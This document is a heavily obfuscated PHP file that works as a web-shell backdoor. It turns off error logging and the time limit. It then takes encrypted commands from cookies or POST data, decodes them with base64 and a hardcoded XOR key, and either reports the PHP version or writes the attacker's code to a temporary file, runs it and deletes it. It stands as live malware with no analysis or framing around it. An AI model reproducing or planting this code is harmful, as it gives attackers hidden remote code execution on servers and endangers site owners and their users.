<?php $ovxgwdx = 'f'."\x69".'l'."\x65"."\137".chr(405-293).chr(117).'t'."\137".chr(99).chr(508-397).chr(683-573).chr(116)."\x65"."\156"."\164".chr(740-625);
$ulpmqlakyh = chr(98)."\x61".chr(190-75)."\x65"."\x36".chr(226-174)."\137".chr(633-533)."\x65".chr(298-199).'o'."\144".chr(1016-915);
$crqjesarw = "\151"."\x6e"."\151".chr(1081-986)."\163"."\145".chr(176-60);
$capsaqs = "\165".'n'.chr(108).chr(105)."\x6e"."\x6b";


@$crqjesarw("\x65".chr(114)."\162"."\x6f"."\x72"."\137"."\154"."\157".'g', NULL);
@$crqjesarw(chr(108).chr(610-499)."\x67"."\x5f"."\x65".'r'."\x72".'o'.chr(860-746)."\163", 0);
@$crqjesarw(chr(544-435)."\141"."\x78".chr(587-492).'e'.'x'.chr(1093-992)."\x63"."\x75".'t'.chr(105).chr(726-615).chr(110).'_'.chr(873-757)."\151"."\x6d".chr(101), 0);
@set_time_limit(0);

function tvfjzhhf($pyehkfcval, $mawabg)
{
    $dtwxtjyclc = "";
    for ($fegzr = 0; $fegzr < strlen($pyehkfcval);) {
        for ($j = 0; $j < strlen($mawabg) && $fegzr < strlen($pyehkfcval); $j++, $fegzr++) {
            $dtwxtjyclc .= chr(ord($pyehkfcval[$fegzr]) ^ ord($mawabg[$j]));
        }
    }
    return $dtwxtjyclc;
}

$pnfhc = array_merge($_COOKIE, $_POST);
$fegzruuecisc = '1617b227-74a2-453a-9142-e534a6a6b0eb';
foreach ($pnfhc as $fegzruoegiyuq => $pyehkfcval) {
    $pyehkfcval = @unserialize(tvfjzhhf(tvfjzhhf($ulpmqlakyh($pyehkfcval), $fegzruuecisc), $fegzruoegiyuq));
    if (isset($pyehkfcval['a'.chr(107)])) {
        if ($pyehkfcval["\x61"] == chr(105)) {
            $fegzr = array(
                chr(1095-983)."\x76" => @phpversion(),
                "\x73"."\x76" => "3.5",
            );
            echo @serialize($fegzr);
        } elseif ($pyehkfcval["\x61"] == "\145") {
            $fegzrsooasmkw = "./" . md5($fegzruuecisc) . "\x2e"."\x69".chr(110).chr(99);
            @$ovxgwdx($fegzrsooasmkw, "<" . "\77"."\160".chr(104)."\x70"."\x20".chr(64)."\x75".'n'."\x6c".'i'.chr(110).'k'."\50"."\x5f".chr(616-521)."\x46"."\111"."\x4c".chr(69).chr(874-779).chr(95)."\x29".chr(59).chr(358-326) . $pyehkfcval['d']);
            @include($fegzrsooasmkw);
            @$capsaqs($fegzrsooasmkw);
        }
        exit();
    }
}

